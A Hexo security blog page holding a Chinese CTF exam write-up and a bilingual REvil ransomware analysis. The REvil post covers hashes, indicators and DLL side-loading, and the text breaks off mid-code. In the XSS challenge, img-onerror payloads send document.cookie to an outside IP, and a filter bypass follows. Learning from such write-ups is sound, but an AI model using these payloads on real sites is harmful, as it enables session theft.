<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>HackThe4O4</title>

  <!-- keywords -->
  

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="Documenting the journey of cyber security">
<meta property="og:type" content="website">
<meta property="og:title" content="HackThe4O4">
<meta property="og:url" content="https://no-flag.com/page/3/index.html">
<meta property="og:site_name" content="HackThe4O4">
<meta property="og:description" content="Documenting the journey of cyber security">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="Noflag">
<meta name="twitter:card" content="summary">
  
    <link rel="alternative" href="/atom.xml" title="HackThe4O4" type="application/atom+xml">
  
  
    <link rel="icon" href="/img/cat.jpg">
  
  
<link rel="stylesheet" href="/css/style.css">

  
  

  
<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>

  
<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>


  


<meta name="generator" content="Hexo 7.3.0"></head>
<body>
  <div id="container">
    <div id="particles-js"></div>
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			
			<img lazy-src="/img/mela.gif" class="js-avatar">
			
		</a>

		<hgroup>
		  <h1 class="header-author"><a href="/"></a></h1>
		</hgroup>

		

		

		<div class="switch-area">
			<div class="switch-wrap">
				<section class="switch-part switch-part1">
					<nav class="header-menu">
						<ul>
						
							<li><a href="/2024/12/21/hello-world/">About Me</a></li>
				        
							<li><a href="/archives">All articles</a></li>
				        
						</ul>
					</nav>
					<nav class="header-nav">
						<div class="social">
							
						</div>
					</nav>
				</section>
				
				
				
				

				
			</div>
		</div>
	</header>				
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
  	<div class="overlay">
  		<div class="slider-trigger"></div>
  		<h1 class="header-author js-mobile-header hide"></h1>
  	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
				<img lazy-src="/img/mela.gif" class="js-avatar">
			</div>
			<hgroup>
			  <h1 class="header-author"></h1>
			</hgroup>
			
			<nav class="header-menu">
				<ul>
				
					<li><a href="/2024/12/21/hello-world/">About Me</a></li>
		        
					<li><a href="/archives">All articles</a></li>
		        
		        <div class="clearfix"></div>
				</ul>
			</nav>
			<nav class="header-nav">
				<div class="social">
					
				</div>
			</nav>
		</header>				
	</div>
</nav>
      <div class="body-wrap">
  
    <article id="post-SCIST_final" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/SCIST_final/" class="article-date">
  	<time datetime="2024-12-21T12:32:07.094Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/12/21/SCIST_final/">
        SCIST Final Exam
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><a target="_blank" rel="noopener" href="https://ctf.scist.org/challenges">平台</a><br><img src="https://i.imgur.com/gpHhMXK.png" alt=""></p>
<h2 id="wELCOME"><a href="#wELCOME" class="headerlink" title="wELCOME"></a>wELCOME</h2><p>F12開起來，FLAG藏裡面<br><img src="https://i.imgur.com/EuX2hiT.png" alt=""></p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Intruder-1-3"><a href="#Intruder-1-3" class="headerlink" title="Intruder 1/3"></a>Intruder 1/3</h3><p><img src="https://i.imgur.com/wnhJ6eW.png" alt=""><br>這題的wireshark檔案在過濾後好像是這些奇怪的來源?因為Huge Ports 大埠通訊的來源通常都怪怪的<br><code>dns or ((tcp.srcport &gt;=1024 and tcp.dstport &gt;=1024) and (tcp.flags.syn==1 or tcp.flags.fin==1 or
tcp.flags.reset==1))</code><br><img src="https://i.imgur.com/oj94ZLN.png" alt=""><br>後來打算先看看decryption key裡面有沒有其他線索，用IDA反解過去，flag就出來嘞<br><img src="https://i.imgur.com/Q84Ifpy.png" alt=""></p>
<h3 id="FruteForce"><a href="#FruteForce" class="headerlink" title="FruteForce?"></a>FruteForce?</h3><p><img src="https://i.imgur.com/ffN3pV1.png" alt=""></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> Real, BitVecRef, BitVecVal, Int, Extract, Solver, SolverFor, Concat, Or, And, If, sat, simplify, LShR, Sum, URem, UDiv, set_option, Tactic</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    x = [Int(<span class="string">&#x27;apple&#x27;</span>), Int(<span class="string">&#x27;orange&#x27;</span>), Int(<span class="string">&#x27;lemon&#x27;</span>)]</span><br><span class="line">    s = Solver()</span><br><span class="line">    s.add(x[<span class="number">0</span>]*x[<span class="number">0</span>]+x[<span class="number">1</span>]*x[<span class="number">1</span>] == <span class="number">256325</span>)</span><br><span class="line">    s.add(x[<span class="number">0</span>]*x[<span class="number">2</span>] == x[<span class="number">1</span>]*<span class="number">13910</span>+<span class="number">441</span>)</span><br><span class="line">    <span class="keyword">while</span> (t := s.check()) == sat:</span><br><span class="line">        m = s.model()</span><br><span class="line">        <span class="built_in">print</span>(m)</span><br><span class="line">        apple, orange, lemon = [m[x[i]].as_long() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x))]</span><br><span class="line">        <span class="built_in">print</span>(<span class="number">3</span>**apple == (orange**<span class="number">3</span>+lemon))</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">pow</span>(orange, apple, lemon))</span><br><span class="line">        s.add(Or([x[i] != m[x[i]].as_long() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x))]))</span><br><span class="line">    <span class="built_in">print</span>(t)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>這題其實很玄，因為一開始用z3正常的方式解三元方程式可是一直解不出答案，後來換個方式去算<br><img src="https://i.imgur.com/YW8iekl.png" alt=""></p>
<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Are-you-admin"><a href="#Are-you-admin" class="headerlink" title="Are you admin?"></a>Are you admin?</h3><p>登入後發現有一個 /flag1 的頁面，不過 get 該頁面時會回傳 <code>&#123;&quot;done&quot;:false,&quot;msg&quot;:&quot;Not admin :(&quot;&#125;</code>, 發現 cookie 中有一個 is_admin，當 is_admin 為 true 時，便能成功讀取 /flag 頁面中的 flag。<br><img src="https://i.imgur.com/6JsxjQE.png" alt=""><br><img src="https://i.imgur.com/xP5zszv.png" alt=""></p>
<h3 id="Login-as-ADMIN"><a href="#Login-as-ADMIN" class="headerlink" title="Login as ADMIN ?"></a>Login as ADMIN ?</h3><p>接着發現網站上有兩個頁面 /note.html 以及 /share, /note 中有一個能夠上傳字串到服務器的功能（類似論壇）,或許會有 XSS 的問題。同過 payload: <code>&lt;h1&gt;aaaaaa&lt;/h1&gt;</code> 的測試後發現 XSS 問題確實存在。</p>
<p>接着 /report 頁面似乎提供服務器主動訪問目標 url 的功能，首先來驗證服務器是否對外連網，可以使用 <code>python3 -m http.server &lt;your_port&gt;</code> 或是 <code>tcpdump -i &lt;your_interface&gt; port &lt;your port&gt;</code> 進行測試，驗證了服務器有對外連線。<br><img src="https://i.imgur.com/MvAQZmt.png" alt=""></p>
<p>看起來 /report 頁面會使服務器用 get 方式訪問 url，因此這裡或許可以使用不需要 victim 互動的 reflected XSS。</p>
<p>在 notes 頁面中通過 payload:<code>&lt;img src=x onerror=this.src=&#39;http://27.147.28.70:9945/?&#39;+document.cookie;&gt;</code> 驗證此 payload 的有效性<br><img src="https://i.imgur.com/QCaGOUG.png" alt=""></p>
<p>不過在 share 頁面中卻無效了，review 過 /share 頁面的原始碼後發現該頁面有客戶端的 filter，該 filter 會將 on 以及 ig 字串刪除。<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">(<span class="title function_">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; done, note &#125; = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;/share&#x27;</span>+location.<span class="property">search</span>).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> res.<span class="title function_">json</span>())</span><br><span class="line">    <span class="keyword">if</span> (!done) <span class="keyword">return</span> <span class="title function_">alert</span>(msg || <span class="string">&quot;Unknown error&quot;</span>)</span><br><span class="line">    content.<span class="property">innerHTML</span> = (note || <span class="string">&quot;&quot;</span>).<span class="title function_">replaceAll</span>(<span class="string">&#x27;&lt;/pre&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>).<span class="title function_">replaceAll</span>(<span class="regexp">/on/ig</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">&#125;)()</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<p>而想要繞過也很簡單，我們可以將 onerror 修改為 oonnerror，因此整體 payload 為：<code>&lt;img src=x oonnerror=this.src=&#39;http://27.147.28.70:9945/?&#39;+document.cookie;&gt;</code><br>將含有該 payload 的 /share 頁面作為 /report 頁面的 url 後，相當於對服務器主機發起 reflect XSS 攻擊，最終能成功取得主機的 cookie。<br><img src="https://i.imgur.com/YQEVzxJ.png" alt=""></p>
<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="Vault"><a href="#Vault" class="headerlink" title="Vault"></a>Vault</h3><p>使用 <a target="_blank" rel="noopener" href="https://github.com/rocky/python-uncompyle6/">uncompyle6</a> 將 .pyc 逆向回 .py，<br>可以發現 .py 中驗證機制如何運作，<br>密碼是 20 位數字，具體我忘了，但反正有 flag 就好 科科<br><img src="https://i.imgur.com/bSEwyxf.png" alt=""></p>
<h3 id="Reverse-1"><a href="#Reverse-1" class="headerlink" title="Reverse"></a>Reverse</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ file reverse</span><br><span class="line">reverse: data</span><br><span class="line">❯ xxd reverse</span><br><span class="line">00000000: 0000 0000 0000 0000 0000 0000 0000 0001  ................</span><br><span class="line">&lt;skip&gt;</span><br><span class="line">00004830: 4429 0f20 3a67 6e69 7274 73b8 4800 4824  D). :gnirts.H.H$</span><br><span class="line">00004840: 44c6 3024 7c8d 48c0 3100 0000 d824 8489  D.0$|.H.1....$..</span><br><span class="line">&lt;skip&gt;</span><br><span class="line">000053a0: 0000 0000 0000 656c 6261 5465 6e6f 6c43  ......elbaTenolC</span><br><span class="line">000053b0: 4d54 7265 7473 6967 6572 5f4d 5449 5f00  MTretsiger_MTI_.</span><br><span class="line">000053c0: 5f5f 7472 6174 735f 6e6f 6d67 5f5f 0065  __trats_nomg__.e</span><br><span class="line">000053d0: 6c62 6154 656e 6f6c 434d 5472 6574 7369  lbaTenolCMTretsi</span><br><span class="line">000053e0: 6765 7265 645f 4d54 495f 0035 2e32 2e32  gered_MTI_.5.2.2</span><br><span class="line">000053f0: 5f43 4249 4c47 0034 2e32 5f43 4249 4c47  _CBILG.4.2_CBILG</span><br><span class="line">00005400: 0034 2e33 2e32 5f43 4249 4c47 0037 2e32  .4.3.2_CBILG.7.2</span><br><span class="line">00005410: 5f43 4249 4c47 006e 6961 6d5f 7472 6174  _CBILG.niam_trat</span><br><span class="line">00005420: 735f 6362 696c 5f5f 0070 6d63 7274 7300  s_cbil__.pmcrts.</span><br><span class="line">00005430: 6b68 635f 6674 6e69 7270 735f 5f00 657a  khc_ftnirps__.ez</span><br><span class="line">00005440: 696c 616e 6966 5f61 7863 5f5f 006e 656c  ilanif_axc__.nel</span><br><span class="line">00005450: 7274 7300 6c69 6166 5f6b 6863 5f6b 6361  rts.liaf_khc_kca</span><br><span class="line">00005460: 7473 5f5f 0073 7475 7000 666e 6163 735f  ts__.stup.fnacs_</span><br><span class="line">00005470: 3939 636f 7369 5f5f 0062 6f72 666d 656d  99cosi__.borfmem</span><br><span class="line">00005480: 006b 6863 5f66 746e 6972 705f 5f00 362e  .khc_ftnirp__.6.</span><br><span class="line">00005490: 6f73 2e63 6269 6c00 0000 0000 0000 0000  os.cbil.........</span><br><span class="line">&lt;skip&gt;</span><br><span class="line">00005920: 0000 0000 0000 0318 0000 0000 0000 0318  ................</span><br><span class="line">00005930: 0000 0004 0000 0003 0000 0000 0000 0008  ................</span><br><span class="line">00005940: 0000 0000 0000 02d8 0000 0000 0000 02d8  ................</span><br><span class="line">00005950: 0000 0000 0000 0040 0000 0000 0000 0040  .......@.......@</span><br><span class="line">00005960: 0000 0000 0000 0040 0000 0004 0000 0006  .......@........</span><br><span class="line">00005970: 0025 0026 0040 000d 0038 0040 0000 0000  .%.&amp;.@...8.@....</span><br><span class="line">00005980: 0000 0000 0000 5030 0000 0000 0000 0040  ......P0.......@</span><br><span class="line">00005990: 0000 0000 0000 12a0 0000 0001 003e 0003  .............&gt;..</span><br><span class="line">000059a0: 0000 0000 0000 0000 0001 0102 464c 457f  ............FLE.</span><br></pre></td></tr></table></figure>
<p>看到最後的 FLE. 以及中間的字串基本能確定這是一個經過了翻轉的 ELF 檔案。 </p>
<p>查到<a target="_blank" rel="noopener" href="https://unix.stackexchange.com/questions/416401/how-to-reverse-the-content-of-binary-file">本網站</a>，把整個檔案倒過來：<code>&lt; reverse xxd -p -c1 | tac | xxd -p -r &gt; reverse_out</code></p>
<p>使用 ghidra 的反編譯進行逆向後可見：<br><img src="https://i.imgur.com/yb4S9SP.png" alt=""></p>
<p>單純反組譯：<br><img src="https://i.imgur.com/y9HzSmG.png" alt=""></p>
<p>使用動態分析方式在 <code>call memfrob</code> 後下斷點，然後直接觀察 magic 變數的值。<br><img src="https://i.imgur.com/6gi229J.png" alt=""><br>var_8h（也就是 magic）的 hex 值轉換為 ASCII 為 “esrever”</p>
<p><img src="https://i.imgur.com/GGGNbax.png" alt=""></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>






  
    <article id="ransom-REvil_Ransomware_Analysis(CN&amp;ENG)" class="article article-type-ransom" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/REvil_Ransomware_Analysis(CN&ENG)/" class="article-date">
  	<time datetime="2024-12-21T12:32:07.093Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/12/21/REvil_Ransomware_Analysis(CN&ENG)/">
        REvil Ransomware Analysis(CN&amp;ENG)
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><strong>hash value MD5: 561cffbaba71a6e8cc1cdceda990ead4</strong></p>
<p><a target="_blank" rel="noopener" href="https://github.com/cado-security/DFIR_Resources_REvil_Kaseya.git">sample passwd:infected</a></p>
<p>工具tool:</p>
<ul>
<li>OllyDBG</li>
<li>IDA 7.2</li>
<li>winhex</li>
<li>PEstdio</li>
<li>Resource Hacker</li>
<li>CyberChef</li>
</ul>
<p>流程圖flow chart:</p>
<p><img src="https://i.imgur.com/TYosvQa.png" alt="https://i.imgur.com/TYosvQa.png"></p>
<p><img src="https://i.imgur.com/8jlMQe5.png" alt="https://i.imgur.com/8jlMQe5.png"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">相依程式dependent program:</span><br><span class="line"></span><br><span class="line">C:\Program Files (x86)\Kaseya\…\AgentMon.exe</span><br><span class="line">(Legitimate Kaseya binary used <span class="keyword">for</span> remote execution)</span><br><span class="line">C:\windows\cert.exe</span><br><span class="line">36a71c6ac77db619e18f701be47d79306459ff1550b0c92da47b8c46e2ec0752</span><br><span class="line">(Not on VirusTotal)</span><br><span class="line">C:\kworking\agent.crt</span><br><span class="line">45AEBD60E3C4ED8D3285907F5BF6C71B3B60A9BCB7C34E246C20410CF678FC0C</span><br><span class="line">C:\kworking\agent.exe</span><br><span class="line">MD5 561cffbaba71a6e8cc1cdceda990ead4</span><br><span class="line">SHA-1 5162f14d75e96edb914d1756349d6e11583db0b0</span><br><span class="line">SHA-256 d55f983c994caa160ec63a59f6b4250fe67fb3e8c43a388aec60a4a6978e9f1e</span><br><span class="line">(Primary malicious REvil Binary, drops legit \msmpeng.exe and malicious side-loaded dll mpsvc.dll below)</span><br><span class="line">C:\windows\msmpeng.exe</span><br><span class="line">MD5 8cc83221870dd07144e63df594c391d9</span><br><span class="line">SHA-1 3d409b39b8502fcd23335a878f2cbdaf6d721995</span><br><span class="line">SHA-256 33bc14d231a4afaa18f06513766d5f69d8b88f1e697cd127d24fb4b72ad44c7a</span><br><span class="line">(Non-Malicious MS Defender Binary used <span class="keyword">for</span> side loading)</span><br><span class="line">C:\Windows\mpsvc.dll</span><br><span class="line">MD5 a47cf00aedf769d60d58bfe00c0b5421</span><br><span class="line">SHA-1 656c4d285ea518d90c1b669b79af475db31e30b1</span><br><span class="line">SHA-256 8dd620d9aeb35960bb766458c8890ede987c33d239cf730f93fe49d90ae759dd</span><br><span class="line">(Side-loaded DLL)</span><br><span class="line">And additional indicators of the likely first stages of the attacks from Huntress Labs and TrueSec:</span><br><span class="line">Access from 18[.]223.199.234 and 161.35.239[.]148 to:</span><br><span class="line">– /dl.asp</span><br><span class="line">– /cgi-bin/KUpload.dll</span><br><span class="line">– /userFilterTableRpt.asp</span><br><span class="line">Creation on the VSA server of:</span><br><span class="line">/Kaseya/WebPages/ManagedFiles/VSATicketFiles/Screenshot.jpg</span><br><span class="line">/Kaseya/webpages/managedfiles/vsaticketfiles/agent.crt</span><br><span class="line">/Kaseya/webpages/managedfiles/vsaticketfiles/agent.exe</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://app.any.run/tasks/c6e06852-4c1b-4ea4-8434-2a8f9c32505f/">Implementation process</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cadosecurity.com/resources-for-dfir-professionals-responding-to-the-revil-ransomware-kaseya-supply-chain-attack/">Resources for DFIR Professionals Responding to the REvil Ransomware Kaseya Supply Chain Attack</a></p>
<h1 id="分析流程analysis-process"><a href="#分析流程analysis-process" class="headerlink" title="分析流程analysis process"></a>分析流程analysis process</h1><p>拿一個“agent.exe”文件到“PE”看看他的執行文件</p>
<blockquote>
<p>Let’s take a “agent.exe” file to “PE” to see his executive file</p>
</blockquote>
<p><img src="https://i.imgur.com/aMjp2V4.png" alt="https://i.imgur.com/aMjp2V4.png"></p>
<p>使用Resource Hacker可以存儲由Agent.exe執行的檔案</p>
<blockquote>
<p>use Resource Hacker can store archives performed by Agent.exe</p>
</blockquote>
<p><img src="https://i.imgur.com/11HQFyL.png" alt="https://i.imgur.com/11HQFyL.png"></p>
<p>現在我們需要看看在IDA中執行REVil</p>
<blockquote>
<p>and now we need to see how to executable REvil in ida</p>
</blockquote>
<p><img src="https://i.imgur.com/ZA8VSPZ.png" alt="https://i.imgur.com/ZA8VSPZ.png"></p>
<p>您可以發現該示例提取了兩個資源文件並存儲在C:\\ Windows</p>
<blockquote>
<p>You can find that the sample extracts two resource files and stored in C:\\ Windows</p>
</blockquote>
<p><img src="https://i.imgur.com/Nt9Vh5v.png" alt="https://i.imgur.com/Nt9Vh5v.png"></p>
<p><img src="https://i.imgur.com/sAckwfE.png" alt="https://i.imgur.com/sAckwfE.png"></p>
<p>然後調用createprocessw執行，文件名是</p>
<blockquote>
<p>then call createprocessw to execute, the file names are</p>
<ul>
<li>MsMpEng.exe</li>
<li>mpsvc.dll</li>
</ul>
</blockquote>
<p>.rsrc -&gt; MODLIS.101 -&gt; mpsvc.dll(Malicious. REvil encrypted dll module)<br>.rsrc -&gt; SOFTIS.101 -&gt; MsMpEng.exe</p>
<p>sub_401000 ; Dropper Function(It is a function of the file that will be thrown out.)</p>
<p>將兩個文件從資源拖放到磁盤上，然後使用 createProcess 執行 msmpeng.exe</p>
<blockquote>
<p>Drop two files from resource onto disk, then use createProcess to execute msmpeng.exe</p>
</blockquote>
<p>它將加載mpsvc.dll(不正常)…這被稱為Dll SideLoading，惡意攻擊將開始運行。</p>
<blockquote>
<p>It will load mpsvc.dll (not normal) … This is called Dll SideLoading, and the malicious revil will start running.</p>
</blockquote>
<p><img src="https://i.imgur.com/Q5U8sPm.png" alt="https://i.imgur.com/Q5U8sPm.png"></p>
<p>正常的執行文件存儲在 <strong>C:\\Program Files\\Windows Defender\\</strong> 中，我們可以看到msmpeng.exe和mpsvc.dll文件，兩者都是普通文件</p>
<blockquote>
<p>The normal execution file is stored in C:\\Program Files\\Windows Defender\\, We can see msmpeng. exe and mpsvc. DLL files, both of which are normal files</p>
</blockquote>
<p><img src="https://i.imgur.com/M1ZlFwi.png" alt="https://i.imgur.com/M1ZlFwi.png"></p>
<p>原始惡意程序的可執行文件與普通文件一樣命名為mpsvc.dll</p>
<blockquote>
<p>The executable file of the original malicious program is named mpsvc.dll as the normal file</p>
</blockquote>
<p>但通常惡意程序沒有權限替換正常的可執行文件</p>
<blockquote>
<p>But normally a malicious program does not have permission to replace a normal executable file</p>
</blockquote>
<p>相反，它會將exe + DLL組合轉儲到一個目錄，例如:%temp%或類似的東西</p>
<blockquote>
<p>Instead, it will dump the exe + DLL combination into a directory ex: %temp% or something like that</p>
</blockquote>
<p>再來..一開始載入dll後可以看到它的export table(正常來說dll都會有)</p>
<blockquote>
<p>When you first load the DLL, you can see its export table.</p>
</blockquote>
<p><img src="https://i.imgur.com/XsupjtI.png" alt="https://i.imgur.com/XsupjtI.png"></p>
<p>每個都點入看會發現除了ServiceCrtMain內有些東西,其他看下來感覺都沒甚麼東西(程式內沒有什麼值得注意的)<br>點入後再進去看看StartAddress</p>
<blockquote>
<p>if you click on each one, you will find that there are some things in servicecrtmain, and there is nothing else to look at (there is nothing worth noting in the program)<br>Click in and then go inside and look at StartAddress</p>
</blockquote>
<p><img src="https://i.imgur.com/1WPFYLp.png" alt="https://i.imgur.com/1WPFYLp.png"></p>
<p>然後會跳轉到…</p>
<blockquote>
<p>Then it jumps to…</p>
</blockquote>
<p><img src="https://i.imgur.com/jynjMN5.png" alt="https://i.imgur.com/jynjMN5.png"></p>
<p>接下來可以點到sub_10001110中</p>
<blockquote>
<p>Next you can click on sub_10001110</p>
</blockquote>
<p><img src="https://i.imgur.com/yrwS7fB.png" alt="https://i.imgur.com/yrwS7fB.png"></p>
<p>感覺是在解密KEY,因為dword_100BCC20會傳13h的Byte</p>
<blockquote>
<p>It feels in the decryption key, because DWORD_100BCC 20 will pass 13h Byte</p>
</blockquote>
<p><img src="https://i.imgur.com/XdPManF.png" alt="https://i.imgur.com/XdPManF.png"></p>
<p>再回去看unk_1009D000這段寫了什麼，裡面應該可以解密出一些KEY</p>
<blockquote>
<p>Go back to see what the unk_1009d000 has written this, and it should be able to decrypt some Key.</p>
</blockquote>
<p><img src="https://i.imgur.com/SZUCqqo.png" alt="https://i.imgur.com/SZUCqqo.png"></p>
<p><strong>sub_10001000&gt;sub_10001B30</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_10001B30</span><span class="params">(<span class="type">int</span> a1, <span class="type">void</span> *a2, <span class="type">int</span> a3, <span class="type">void</span> *a4, <span class="type">size_t</span> a5)</span></span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *v5; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">size_t</span> v9; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">char</span> *v10; <span class="comment">// ebp</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [esp+Ch] [ebp+4h]</span></span><br><span class="line"></span><br><span class="line">  v5 = (_DWORD *)a1;</span><br><span class="line">  v6 = *(_DWORD *)a1;</span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)(*(_DWORD *)a1 + <span class="number">16</span>) &amp; <span class="number">0x100000</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = (*(<span class="type">int</span> (__cdecl **)(<span class="type">int</span>, <span class="type">void</span> *, <span class="type">void</span> *, <span class="type">size_t</span>))(v6 + <span class="number">24</span>))(a1, a2, a4, a5);</span><br><span class="line">    <span class="keyword">if</span> ( v7 &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)a3 = v7;</span><br><span class="line">      result = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)a3 = <span class="number">0</span>;</span><br><span class="line">      result = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( (<span class="type">signed</span> <span class="type">int</span>)a5 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)(a1 + <span class="number">92</span>) &amp; <span class="number">0x100</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = sub_10001D80(a1, (<span class="type">int</span>)a2, a3, a4, a5);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v9 = *(_DWORD *)(v6 + <span class="number">4</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v9 &gt; <span class="number">0x20</span> )</span><br><span class="line">        sub_10002B60((<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;.\\\\crypto\\\\evp\\\\evp_enc.c&quot;</span>, <span class="number">457</span>, <span class="string">&quot;b &lt;= sizeof ctx-&gt;final&quot;</span>);</span><br><span class="line">      v10 = (<span class="type">char</span> *)a2;</span><br><span class="line">      <span class="keyword">if</span> ( *(_DWORD *)(a1 + <span class="number">100</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        memmove(a2, (<span class="type">const</span> <span class="type">void</span> *)(a1 + <span class="number">108</span>), v9);</span><br><span class="line">        v11 = <span class="number">1</span>;</span><br><span class="line">        v10 = (<span class="type">char</span> *)a2 + v9;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v11 = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      result = sub_10001D80((<span class="type">int</span>)v5, (<span class="type">int</span>)v10, a3, a4, a5);</span><br><span class="line">      <span class="keyword">if</span> ( result )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v9 &lt;= <span class="number">1</span> || v5[<span class="number">3</span>] )</span><br><span class="line">        &#123;</span><br><span class="line">          v5[<span class="number">25</span>] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          *(_DWORD *)a3 -= v9;</span><br><span class="line">          v5[<span class="number">25</span>] = <span class="number">1</span>;</span><br><span class="line">          memmove(v5 + <span class="number">27</span>, &amp;v10[*(_DWORD *)a3], v9);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v11 )</span><br><span class="line">          *(_DWORD *)a3 += v9;</span><br><span class="line">        result = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)a3 = <span class="number">0</span>;</span><br><span class="line">    result = a5 == <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>sub_10001B30這裡面應該是一段解密的Function</p>
<blockquote>
<p>Sub_10001b30 should be a decrypted Function</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> __cdecl <span class="title function_">sub_10001000</span><span class="params">(<span class="type">void</span> *a1, <span class="type">size_t</span> a2, <span class="type">int</span> a3, <span class="type">int</span> a4, <span class="type">int</span> a5)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *v5; <span class="comment">// eax</span></span><br><span class="line">  HANDLE v7; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !(dword_100BEE74 &amp; <span class="number">1</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    dword_100BEE74 |= <span class="number">1u</span>;</span><br><span class="line">    dword_100BEE70 = (<span class="type">void</span> *)sub_10001590();</span><br><span class="line">  &#125;</span><br><span class="line">  v5 = sub_10002310();</span><br><span class="line">  <span class="keyword">if</span> ( sub_10001B10(dword_100BEE70, (<span class="type">int</span>)v5, <span class="number">0</span>, a3, <span class="number">0</span>) == <span class="number">-1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v7 = GetProcessHeap();</span><br><span class="line">  dword_100BEE78 = HeapAlloc(v7, <span class="number">8u</span>, a2 + <span class="number">32</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !dword_100BEE78 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !sub_10001B30((<span class="type">int</span>)dword_100BEE70, dword_100BEE78, (<span class="type">int</span>)&amp;dword_100BEE68, 